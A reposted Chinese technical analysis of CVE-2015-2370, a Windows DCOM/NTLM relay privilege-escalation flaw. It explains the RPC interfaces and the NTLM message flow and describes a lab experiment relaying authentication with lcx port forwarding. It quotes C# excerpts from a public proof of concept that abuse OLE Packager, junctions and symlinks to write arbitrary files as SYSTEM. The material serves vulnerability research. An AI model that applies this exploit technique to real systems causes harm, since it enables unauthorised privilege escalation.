# CVE-2015-2370之DCOM DCE/RPC协议原理详细分析

阅读量 **319240**

|评论 **2**

发布时间 : 2018-12-03 15:15:11

 **x**

##### 译文声明

本文是翻译文章，文章原作者 oShuangYue12，文章来源：blog.csdn.net

原文地址：<https://blog.csdn.net/oShuangYue12/article/details/84677607>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t010e9ca1d536336a0b.png)

## 漏洞成因分析

这个CVE-2015-2370漏洞是一种DCOM DCE/RPC协议中ntlm认证后数据包重放导致的权限提升漏洞

分析的重点DCOM DCE/RPC协议原理,这个协议主要由2块内容组成,dcom的远程激活机制和ntlm身份认证

###  1.dcom的远程激活机制

[微软官方解释](https://msdn.microsoft.com/en-us/library/cc226801.aspx "微软官方解释")

有一个运行在135端口的rpcss服务也就是dcom的激活服务负责协调本机所有com对象的激活,当本机激活时采用通过内核通信,无法捕获数据包,属于内部操作,只有当远程激活或远程重定向到本机激活这种方式才可以捕获到数据包.远程激活有2种方式,一种是采用CoCreateInstanceEx方式指定远程服务器和激活身份等参数调用rpscss的IRemoteSCMActivator接口的RemoteCreateInstance方法激活,或者CoGetClassObject
=调用rpscss的IRemoteSCMActivator接口的RemoteGetClassObject方法激活同样可选指定远程服务器和激活身份等参数.还有一种方式方式是客户端marshal服务端unmarshal方式,在marshal的stream中写入[OBJREF](https://msdn.microsoft.com/en-us/library/cc226828.aspx
"OBJREF")通过其中的DUALSTRINGARRAY字段指定远程解析的服务器或端口,远程服务器rpcss服务采用IObjectExporter接口中的ResolveOxid或ResolveOxid2方法实现反序列化出来需要unmarshal的远程com对象remunkown指针.CVE-2015-2370是通过在ntlm身份认证后在ResolveOxid2之后又重放了一个RemoteCreateInstance请求导致以客户端的高权限创建出来一个OLE
Packager的文件实现了权限提升.用户也可以创建一个rpc服务实现自己实现这2个接口自定义的rpcss解析和激活服务.这2个模块的可以在rpcss服务加载的rpcss.dll中找到具体实现,以下是接口定义:

    
    
     [
         uuid(99fcfec4-5260-101b-bbcb-00aa0021347a),
         pointer_default(unique)
     ]
      //marshal方式
     interface IObjectExporter
     {
         [idempotent] error_status_t ResolveOxid
         (
     [in]       handle_t        hRpc,
     [in]       OXID           *pOxid,
     [in]       unsigned short  cRequestedProtseqs,
     [in,  ref, size_is(cRequestedProtseqs)]
        unsigned short  arRequestedProtseqs[],
     [out, ref] DUALSTRINGARRAY **ppdsaOxidBindings,
     [out, ref] IPID            *pipidRemUnknown,
     [out, ref] DWORD           *pAuthnHint
         );
    
     [idempotent] error_status_t SimplePing
         (
     [in]  handle_t  hRpc,
     [in]  SETID    *pSetId 
         );
    
     [idempotent] error_status_t ComplexPing
         (
     [in]       handle_t        hRpc,
     [in, out]  SETID          *pSetId,
     [in]       unsigned short  SequenceNum,
     [in]       unsigned short  cAddToSet,
     [in]       unsigned short  cDelFromSet,
     [in, unique, size_is(cAddToSet)]   OID AddToSet[],
     [in, unique, size_is(cDelFromSet)] OID DelFromSet[],
     [out]      unsigned short *pPingBackoffFactor      
         );
    
     [idempotent] error_status_t ServerAlive
         (
     [in]       handle_t        hRpc
         );
    
    
     [idempotent] error_status_t ResolveOxid2
         (
     [in]       handle_t        hRpc,
     [in]       OXID           *pOxid,
     [in]       unsigned short  cRequestedProtseqs,
     [in,  ref, size_is(cRequestedProtseqs)]
        unsigned short  arRequestedProtseqs[],
     [out, ref] DUALSTRINGARRAY **ppdsaOxidBindings,
     [out, ref] IPID            *pipidRemUnknown,
     [out, ref] DWORD           *pAuthnHint,
     [out, ref] COMVERSION      *pComVersion
         );
    
         [idempotent] error_status_t ServerAlive2
         (
     [in]       handle_t        hRpc,
     [out, ref] COMVERSION      *pComVersion,
     [out, ref] DUALSTRINGARRAY **ppdsaOrBindings,
     [out, ref] DWORD           *pReserved
         );
     }
    [
    uuid(000001A0-0000-0000-C000-000000000046),
         pointer_default(unique)
     ]
    //CoCreateInstanceEx方式
     interface IRemoteSCMActivator 
     {
      void Opnum0NotUsedOnWire(void);
      void Opnum1NotUsedOnWire(void);
      void Opnum2NotUsedOnWire(void);
    
     HRESULT RemoteGetClassObject(
                         [in] handle_t rpc,
                         [in] ORPCTHIS *orpcthis,
                         [out] ORPCTHAT *orpcthat,
                         [in,unique]  MInterfacePointer *pActProperties,
                         [out] MInterfacePointer **ppActProperties
                         );
    
     HRESULT RemoteCreateInstance(
                         [in] handle_t rpc,
                         [in] ORPCTHIS *orpcthis,
                         [out] ORPCTHAT *orpcthat,
                         [in,unique]  MInterfacePointer *pUnkOuter,
                         [in,unique]  MInterfacePointer *pActProperties,
                         [out] MInterfacePointer **ppActProperties
                         );
     }

###  2.ntlm身份认证机制分析

[ntlm官方解释](http://davenport.sourceforge.net/ntlm.html)

CVE-2015-2370采用CoGetInstanceFromIStorage方式触发服务器从IStorage自身实现的IMarhal接口的MarshalInterface方法往stream中写入marshaldata

    
    
    HRESULT CoGetInstanceFromIStorage(
      COSERVERINFO *pServerInfo,
      CLSID        *pClsid,
      IUnknown     *punkOuter,
      DWORD        dwClsCtx,
      IStorage     *pstg,
      DWORD        dwCount,
      MULTI_QI     *pResults
    );

marshaldata是一个OBJREF可以通过如下脚本使用010editor解析

    
    
    local unsigned short sizetp;
    struct tagOBJREF {
        byte  signature[4]; 
        unsigned long  flags; 
         struct iid
        {
          unsigned int Data1;
          unsigned ushort Data2;
          unsigned ushort Data3;
          byte Data4[8];
        } _iid;
         if(OBJREF.flags==01h)
         {
           struct tagOBJREF_standard {
            unsigned long  flags; 
            unsigned long  cPublicRefs; 
            struct oxid {
                DWORD LowPart;
                LONG HighPart;
            }  _oxid; 
             struct oid {
                DWORD LowPart;
                LONG HighPart;
            }  _oid;    
                 struct ipid
             {
              unsigned int Data1;
              unsigned ushort Data2;
              unsigned ushort Data3;
              byte Data4[8];
             } _ipid;  
             struct tagDUALSTRINGARRAY {
    
    
                 unsigned short    wNumEntries;
    
               Printf("wNumEntries is %d",sizetp);
                 unsigned short    wSecurityOffset;     
                 sizetp=wSecurityOffset-2;
                 struct tagSTRINGBINDING {
    
                      unsigned short    wTowerId;  
    
                      unsigned short    aNetworkAddr[sizetp];  
    
                   } STRINGBINDING;
                  byte nullterm1[2];
                  struct tagSECURITYBINDING {
    
                    unsigned short    wAuthnSvc;     // Must not be zero
    
                    unsigned short    wAuthzSvc;     // Must not be zero
    
                    unsigned short    aPrincName;    // NULL terminated
    
                   } SECURITYBINDING;
                   byte nullterm2[2];
    
                } dualstringarray;
    
            } OBJREF_standard;
         }
         if(OBJREF.flags==02h)
         {
             struct tagOBJREF_handler {
             unsigned char std[40]; 
                 struct clsid
                {
                  unsigned int Data1;
                  unsigned ushort Data2;
                  unsigned ushort Data3;
                  byte Data4[8];
                } _clsid; 
            unsigned char saResAddr[8]; 
          } OBJREF_handler;
         }
         if(OBJREF.flags==04h)
         {
            struct tagOBJREF_custom {
             struct clsid_custom
             {
                  unsigned int Data1;
                  unsigned ushort Data2;
                  unsigned ushort Data3;
                  byte Data4[8];
                } _clsid_custom; 
            unsigned long  cbExtension; 
            unsigned long  size; 
            unsigned byte pData; 
          } OBJREF_custom;
        }
         if(OBJREF.flags==08h)
         {
            unsigned byte std[40]; 
            unsigned byte pORData[4]; 
            unsigned byte saResAddr[12]; 
         }
    } OBJREF;

结果是一个standard的matshal模式,其中的DUALSTRINGARRAY字段指定远程解析的服务器为127.0.0.1的6666端口,也就是我们要使用中间人攻击监听端口,如下

![](https://i.imgur.com/o6MNUt4.png)

127.0.0.1的6666监听的数据包经过中转后最终发送至135端口的rpcss服务,服务端先进行ServerAlive进行服务器时候在线确认,之后进行ntlm身份认证.

NTLM认证共需要三个消息完成：

![](https://i.imgur.com/2Byp1Fe.png)

(1). Type1 消息: Negotiate 协商消息。

客户端在发起认证时，是首先向服务器发送协商消息,协商需要认证的服务类型从数据包中UUID为IOXIDResolver(99fcfec4-5260-101b-bbcb-00aa0021347a)代表协商的服务是IObjectExporter,如图它被我们替换成了ISystemActivator(000001a0-0000-0000-c000-000000000046)代表协商的服务替换成IRemoteSCMActivator方式,这里CVE-2015-2370为之后重放了一个RemoteCreateInstance请求做铺垫,告诉rpcss服务要最终要激活和请求是RemoteCreateInstance数据包中的内容,Type1
消息中的Negotiate Flags代表客户端要和服务器端协商加密等级

(2). Type2 消息: Challenge 挑战消息。

服务器在收到客户端的协商消息之后，在Negotiate
Flags写入出自己所能接受的加密等级,并生成一个随机数challenge返回给客户端.这个challenge实际上也可以被重放,由接受另一个Authenticate来认证,实现身份窃取,笔者会在接下去的实验中认证.如果Type2
消息的reserved字段不为0,为本机内部认证,可以在[RottenPotato](https://github.com/breenmachine/RottenPotatoNG)类似的方式使用[SSPI](https://docs.microsoft.com/zh-cn/windows/desktop/SecAuthN/authentication-functions)中的函数获取SecurityContext,有兴趣的读者可以研究下.

(3). Type3 消息: Authenticate激活消息。

客户端在收到服务端发回的Challenge消息之后,读取了服务端的随机数challenge。使用自己的客户端身份信息以及服务器的随机数challenge通过复杂的运算,生成一个客户端随机数challenge和客户端的在Negotiate
Flags,如果包含签名这会把整个Authenticate认证消息加入运算,导致身份窃取替换无效,如无签名可以替换,详细看实验证明.Authenticate认证消息发送之后客户端会在服务器端返回之前接着发送ResolveOxid2(IObjectExporter模式)或RemoteCreateInstance(IRemoteSCMActivator模式)给服务器端,告诉服务器端最终需要解析的请求.

(4). 服务器在收到 Type3的消息之后,处理请求后会返回激活成功或失败消息,至此dcom远程激活完成

![](https://i.imgur.com/8RChEx4.png)

###  3.任意文件创建过程

从数据包分析IRemoteSCMActivator::RemoteCreateInstance主要是其中pActProperties结构其中包含这几个常见字段

![](https://i.imgur.com/UiAd0WI.png)

详细解释可以参考[官方文档](https://msdn.microsoft.com/en-us/library/cc226965.aspx),其中InstanceInfoData的InstantiatedObjectClsId是表示要创建com实例的OLE
Packager的clsid:
{F20DA720-C02F-11CE-927B-0800095AE340},由于wireshark错位的原因以二进制中的数据为准

![](https://i.imgur.com/QYznfFU.png)

OLE
Packager是一个ActiveX控件的包格式,会将自身在pActProperties其中的InstanceInfoData字段的ifdStg的marshal结构中的二进制数据写入C:\Users\<username>\AppData\Local\Temp(2)的文件中当被创建时

    
    
    typedef struct tagInstanceInfoData {
       [string] wchar_t* fileName;
       DWORD mode;
       MInterfacePointer* ifdROT;
       MInterfacePointer* ifdStg;
     } InstanceInfoData;
    

![](https://i.imgur.com/drk7AXy.png)

这个ifdStg也是一个OBJREF结构,它通过一个ObjrefMoniker将这个OLE
Packager对象转换而成,CreateObjrefMoniker是一个将com对象marshal后转换成一个moniker可以在ObjrefMoniker::GetDisplayName函数中获取Base64Encoded的OBJREF二进制数据的函数.poc中读取源文件的二进制数据filedata是最终要创建高权限文件的内容写入OLE
Packager,导致在OLE
Packager的unmarshal后位于C:Users<username>AppDataLocalTemp创建一个文件名为(2)的文件内容为filedata,通过创建CreateJunction给temp和C:userspubliclibrariesSym文件夹使(2)的文件也会在Sym里创建,同时创建CreateSymlink给Sym文件夹的(2)文件和最终要写入的任意文件路径,导致(2)中的filedata二进制写入目标文件,最终实现RemoteCreateInstance被服务器端解析后以高权限进程写入任意文件

    
    
            public const string CLSID_Package = "f20da720-c02f-11ce-927b-0800095ae340";
    
            public static IStorage CreatePackageStorage(string name, byte[] filedata)
            {
                 //将源文件的二进制数据filedata写入OLE Packager
                MemoryStream ms = new MemoryStream(PackageBuilder.BuildPackage(name, filedata));
                IStorage stg = CreateStorage("dump.stg");
                ComUtils.OLESTREAM stm = new ComUtils.OLESTREAM();
                stm.GetMethod = (a, b, c) =>
                {
                    //Console.WriteLine("{0} {1} {2}", a, b, c);
    
                    byte[] data = new byte[c];
    
                    int len = ms.Read(data, 0, (int)c);
    
                    Marshal.Copy(data, 0, b, len);
    
                    return (uint)len;
                };
    
                OleConvertOLESTREAMToIStorage(ref stm, stg, IntPtr.Zero);
               //写入OLE Packager的clasid
                Guid g = new Guid(CLSID_Package);
                stg.SetClass(ref g);
    
                return stg;
            }
            //通过ObjrefMoniker创建二进制OBJREF填充ifdStg
            public static byte[] GetMarshalledObject(object o)
            {
                IMoniker mk;
    
                CreateObjrefMoniker(Marshal.GetIUnknownForObject(o), out mk);
    
                IBindCtx bc;
    
                CreateBindCtx(0, out bc);
    
                string name;
    
                mk.GetDisplayName(bc, null, out name);
    
                return Convert.FromBase64String(name.Substring(7).TrimEnd(':'));
            }
    
     [MTAThread]
            static void DoRpcTest(object o, ref RpcContextSplit ctx, string rock, string castle)
            {
                ManualResetEvent ev = (ManualResetEvent)o;
                TcpListener listener = new TcpListener(IPAddress.Loopback, DUMMY_LOCAL_PORT);
                byte[] rockBytes = null;
                //读取源文件的二进制数据filedata写入OLE Packager
                try { rockBytes = File.ReadAllBytes(rock); }
                catch
                {
                    Console.WriteLine("[!] Error reading initial file!");
                    Environment.Exit(1);
                }
    
                Console.WriteLine(String.Format("[+] Loaded in {0} bytes.", rockBytes.Length));
    
                bool is64bit = !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432"));
                try
                {
                    Console.WriteLine("[+] Getting out our toolbox...");
                    if (is64bit)
                    {
                        File.WriteAllBytes("C:\users\public\libraries\createsymlink.exe", Trebuchet.Properties.Resources.CreateSymlinkx64);
                    }
                    else
                    {
                        File.WriteAllBytes("C:\users\public\libraries\createsymlink.exe", Trebuchet.Properties.Resources.CreateSymlinkx86);
                    }             
                }
                catch
                {
                    Console.WriteLine("[!] Error writing to C:\users\public\libraries\createsymlink.exe!");
                    Environment.Exit(1);
                }
    
                string name = GenRandomName();
                string windir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
    
                string tempPath = Path.Combine(windir, "temp", name);
                //Sym文件夹使(2)的文件也会在Sym里创建
                if (!CreateJunction(tempPath, ""C:\users\public\libraries\Sym\"))
                {
                    Console.WriteLine("[!] Couldn't create the junction");
                    Environment.Exit(1);
                }
                 //Sym文件夹使(2)中的filedata二进制写入目标文件castle
                if (CreateSymlink("C:\users\public\libraries\Sym\ (2)", castle)) //Exit bool is inverted!
                {
                    Console.WriteLine("[!] Couldn't create the SymLink!");
                    Environment.Exit(1);
                }
    
                IStorage stg = ComUtils.CreatePackageStorage(name, rockBytes);
                byte[] objref = ComUtils.GetMarshalledObject(stg);
                .....
             }

## 复现小实验

###  1.实验环境

操作系统：Windows Server 20008 R2

开发环境: vs2013

###  2.实验设计

我设计了一个实验来演示ntlm数据包重放现象,[git地址](https://gitee.com/cbwang505/ntlm)

我创建了2个用户alice和bob,分别以alice和bob身份CoCreateInstanceEx创建一个com对象.然后把这2个创建过程的数据包通过2个lcx服务器(192.168.0.6=>proxy1和192.168.0.12->proxy2)的135端口中转至本机135端口,通过以下lcx命令:

在192.168.0.6和192.168.0.12上分别执行

lcx -listen 1234 135

在本机上执行

lcx -slave 192.168.0.6 1234 127.0.0.1 2222

lcx -slave 192.168.0.12 1234 127.0.0.1 6666

过程如下图:

![](https://i.imgur.com/Kx3Lfgo.png)

在这个进程中把把rpcss服务给alice的ntlm认证tyep2
Challenge激活消息转发给接收bob,alice绑定的rpcss服务接收bob的tyep3
Authenticate消息的,把rpcss服务给bob的tyep2 Challenge转发给alice,bob绑定rpcss服务接收alice的tyep3
Authenticate消息的,由于ntlm机制的原因Challenge和Authenticate消息都是本机的激活消息,Authenticate消息也没有给自己添加签名(IRemoteSCMActivator模式),我们看数据包分析

![](https://i.imgur.com/5kTTLkA.png)

结果都返回了RemoteCreateInstance成功的返回消息

接下来我们把alice的身份换成了一个不存在的用户alice1,也以同样的方式转发tyep2 Challenge和tyep3
Authenticate消息,实验的结果是这个不存在的alice1用户反而被bob成功创建CoCreateInstanceEx了com对象,反过来说原本应该成功的bob被alice1的身份替换了反而创建失败

![](https://i.imgur.com/HKfdkru.png)

![](https://i.imgur.com/DiCxZVn.png)

###  3.实验结论

既然alice和bob的消息可以通过替换身份信息创建com对象,那么以CVE-2015-2370中采用CoGetInstanceFromIStorage方式以system权限的IObjectExporter中的ntlm认证消息能以这样方式重放吗,答案是不行的,因为IObjectExporter的tyep3
Authenticate包含对IObjectExporter的签名,rpcss服务还是会对RemoteCreateInstance请求返回拒绝访问,但是CVE-2015-2370方式是可以的因为之前替换了IOXIDResolver了ISystemActivator的激活方式,tyep3
Authenticate消息仍然保持之前对消息签名而且数据包没中转,RemoteCreateInstance请求仍是签名过的,所以最后会成功.另外提一点IObjectExporter的签名等级高于IRemoteSCMActivator,如果有中转IObjectExporter到IRemoteSCMActivator是不行的,但是IRemoteSCMActivator到IObjectExporter是可以的,但是IObjectExporter创建不了com对象,所以没法实现提权.如果读者有兴趣可自行尝试

## 引用

[CVE-2015-2370官方链接](https://bugs.chromium.org/p/project-zero/issues/detail?id=325&can=1&q=dcom&colspec=ID%20Status%20Restrict%20Reported%20Vendor%20Product%20Finder%20Summary
"project-zero")

[poc下载](https://github.com/monoxgas/Trebuchet)

[实验源码git地址](https://gitee.com/cbwang505/ntlm)

本文翻译自blog.csdn.net
[原文链接](https://blog.csdn.net/oShuangYue12/article/details/84677607)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **cbwang505** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/167057](/post/id/167057)

安全客 - 有思想的安全新媒体

本文转载自:
[blog.csdn.net](https://blog.csdn.net/oShuangYue12/article/details/84677607)

如若转载,请注明出处： <https://blog.csdn.net/oShuangYue12/article/details/84677607>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [系统安全](/tag/系统安全)
  * [CVE-2015-2370](/tag/CVE-2015-2370)

 **+1** __3赞

 __收藏

![](https://p1.ssl.qhimg.com/t01157748da67f3fd9c.png) cbwang505

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

